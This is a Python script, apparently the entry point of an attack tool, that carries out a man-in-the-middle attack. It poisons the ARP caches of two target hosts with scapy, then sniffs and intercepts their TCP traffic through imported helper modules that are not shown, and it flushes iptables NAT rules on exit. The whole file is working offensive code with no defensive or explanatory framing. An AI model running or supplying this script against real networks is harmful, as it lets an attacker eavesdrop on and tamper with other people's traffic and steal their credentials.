# Performs a MITM attack on a system using scapy and ARP poisoning.
# Author: Maxwell Bland
from argparse import ArgumentParser
from os import geteuid
from subprocess import call
from sys import exit as sysexit
from util import *
from arp_poison import *
from tcp_MITM import *
import netifaces as ni

if __name__ == "__main__":
    ap = ArgumentParser(
        description="MITM Attack on given IPs using Scapy"
    )
    ap.add_argument("-i", "--interface", required=True,
                    help="network interface to use")
    ap.add_argument("-t", "--targets", required=True, nargs=2,
                    help="target's IP address")
    args = vars(ap.parse_args())

    if not geteuid() == 0:
        sysexit("sudo dummy")
    try:
        print("Starting...")
        A_IP = args['targets'][0]
        B_IP = args['targets'][1]
        interface = args['interface']
        A_MAC = get_mac(A_IP, interface)
        B_MAC = get_mac(B_IP, interface)
        self_MAC = get_if_hwaddr(interface)
        self_IP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']

        poison_thread = threading.Thread(target=arp_poison, args=(A_IP, A_MAC, B_IP, B_MAC, interface))
        poison_thread.daemon = True
        poison_thread.start()
        tcp_MITM = tcp_MITM(interface)
        sn = sniff(iface=interface, prn=tcp_MITM.setup_MITM)
    except IOError:
        sysexit("Interface doesn't exist")
    except KeyboardInterrupt:
        call(("iptables -t nat -F PREROUTING").split(' '))
        print("\nStopping...")


